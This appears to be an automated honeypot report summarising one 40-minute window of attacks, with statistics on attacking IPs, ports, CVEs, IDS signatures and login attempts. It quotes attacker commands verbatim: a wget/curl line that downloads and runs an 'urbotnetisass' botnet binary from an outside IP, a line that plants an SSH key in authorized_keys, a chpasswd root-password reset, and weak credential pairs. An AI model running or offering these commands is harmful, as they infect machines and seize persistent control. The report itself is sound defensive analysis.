Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T00:01:23Z
**Timeframe:** 2025-09-29T23:20:01Z to 2025-09-30T00:00:01Z
**Files Used:**
- agg_log_20250929T232001Z.json
- agg_log_20250929T234001Z.json
- agg_log_20250930T000001Z.json

### Executive Summary

This report summarizes 17,038 attacks recorded by honeypots between 23:20 UTC on September 29, 2025, and 00:00 UTC on September 30, 2025. The majority of attacks were captured by the Cowrie honeypot, with a significant number of events also recorded by Honeytrap, Suricata, and Ciscoasa. The most prominent attacker IP was 160.25.118.10, which was involved in a large number of login attempts. The primary targeted port was 22 (SSH). Several CVEs were exploited, with CVE-1999-0265, CVE-2002-0013 and CVE-2002-0012 being the most frequent. Attackers attempted a variety of commands, including downloading and executing malicious files, reconnaissance, and attempting to establish persistent access.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 10755
- Honeytrap: 2949
- Suricata: 1616
- Ciscoasa: 1440
- Dionaea: 76
- Tanner: 68
- ElasticPot: 32
- Mailoney: 27
- H0neytr4p: 21
- Adbhoney: 14
- Sentrypeer: 15
- ConPot: 9
- Redishoneypot: 7
- Dicompot: 4
- ssh-rsa: 2
- Miniprint: 1
- Ipphoney: 1
- Honeyaml: 1

**Top Attacking IPs:**
- 160.25.118.10: 7841
- 5.129.251.145: 831
- 142.93.159.126: 957
- 185.156.73.166: 373
- 92.63.197.55: 363
- 185.156.73.167: 367
- 92.63.197.59: 339
- 84.60.20.107: 119
- 118.193.43.244: 108
- 40.115.18.231: 108
- 172.210.82.243: 103
- 3.131.215.38: 71
- 188.246.224.87: 94
- 172.245.163.134: 91
- 196.251.80.143: 67
- 222.255.214.140: 85
- 130.83.245.115: 60
- 167.99.55.34: 60
- 106.75.156.189: 50
- 106.75.186.101: 47

**Top Targeted Ports/Protocols:**
- 22: 2078
- 8333: 208
- 80: 69
- TCP/22: 78
- 443: 28
- 9200: 26
- 25: 25
- 7777: 33
- 9999: 24
- 81: 33
- TCP/1080: 39

**Most Common CVEs:**
- CVE-1999-0265
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449
- CVE-2021-35394 CVE-2021-35394

**Commands Attempted by Attackers:**
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...`
- `system`
- `shell`
- `q`
- `enable`
- `sh`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `echo "root:cG89jja6ZDeL"|chpasswd|bash`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cat /proc/mounts; /bin/busybox LBBCV`
- `tftp; wget; /bin/busybox LBBCV`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP group 42
- ET CINS Active Threat Intelligence Poor Reputation IP group 48
- ET DROP Spamhaus DROP Listed Traffic Inbound group 29
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- GPL INFO SOCKS Proxy attempt
- GPL ICMP redirect host

**Users / Login Attempts:**
- vr/123
- root/nPSpP4PBW0
- root/changeme
- teamspeak/teamspeak
- tmpuser/1234
- 345gs5662d34/345gs5662d34
- foundry/foundry
- ubuntu/ubuntu
- admin/ (empty password)
- rancher/rancher
- user/123

**Files Uploaded/Downloaded:**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- boatnet.mpsl
- Mozi.m

**HTTP User-Agents:**
- (No user agents recorded in this period)

**SSH Clients and Servers:**
- (No specific SSH clients or servers recorded in this period)

**Top Attacker AS Organizations:**
- (No AS organization data recorded in this period)

### Key Observations and Anomalies

- **High-Volume Scanning:** A single IP address, 160.25.118.10, was responsible for a disproportionately large number of connection attempts, primarily targeting SSH.
- **Botnet Activity:** The commands executed by attackers, particularly the downloading and execution of files with names like "urbotnetisass" and "Mozi.m," strongly indicate automated botnet activity. These scripts attempt to infect the system and recruit it into a larger botnet.
- **Credential Stuffing:** A wide variety of usernames and passwords were attempted, suggesting large-scale credential stuffing attacks against the SSH service.
- **Persistence Attempts:** Attackers attempted to add their own SSH public key to the `authorized_keys` file, which would allow them to maintain persistent access to the system.
- **Reconnaissance:** Attackers ran several commands to gather information about the system, such as `uname -a`, `lscpu`, `df -h`, and `cat /proc/cpuinfo`. This is a common tactic to determine the type of system they have compromised and what exploits might be effective.
- **Multiple Architectures Targeted:** The downloaded files suggest that the attackers are attempting to compromise systems with different CPU architectures (ARM, x86, MIPS), which is a common feature of modern IoT botnets.
